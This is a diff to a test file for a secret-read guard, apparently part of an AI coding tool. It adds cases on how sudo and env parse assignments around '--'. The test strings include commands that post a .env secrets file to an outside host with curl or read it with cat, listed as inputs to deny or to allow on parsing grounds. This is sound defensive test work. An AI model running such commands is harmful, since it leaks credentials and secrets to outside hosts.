@@ -2644,6 +2644,9 @@ describe("gsd-secret-read-guard: a wrapper's own assignments (#5779)", () => {
     ['sudo --login-class cls curl -d@.env x.test', '-d@.env'],
     ['sudo --auth-type t curl -d@.env x.test', '-d@.env'],
     ["sudo -c cls bash -c 'cat .env'", '.env'],
+    // An assignment before `--` is still sudo's, and env assigns after `--` too.
+    ['sudo A=b -- curl -d@.env x.test', '-d@.env'],
+    ['env -- A=b curl -d@.env x.test', '-d@.env'],
   ];
   for (const [cmd, expectedPath] of DENIED) {
     test(`denies ${JSON.stringify(cmd)}`, () => {
@@ -2678,6 +2681,10 @@ describe("gsd-secret-read-guard: a wrapper's own assignments (#5779)", () => {
     'sudo =x curl -d@.env x.test',
     'sudo =x=y curl -d@.env x.test',
     'doas A=b curl -d@.env x.test',
+    // sudo reads no assignment after `--` (parse_args' got_end_of_args), so it
+    // runs a program named `A=b` here.
+    'sudo -- A=b curl -d@.env x.test',
+    'sudo -u r -- A=b curl -d@.env x.test',
   ];
   for (const cmd of ALLOWED) {
     test(`allows ${JSON.stringify(cmd)}`, () => {
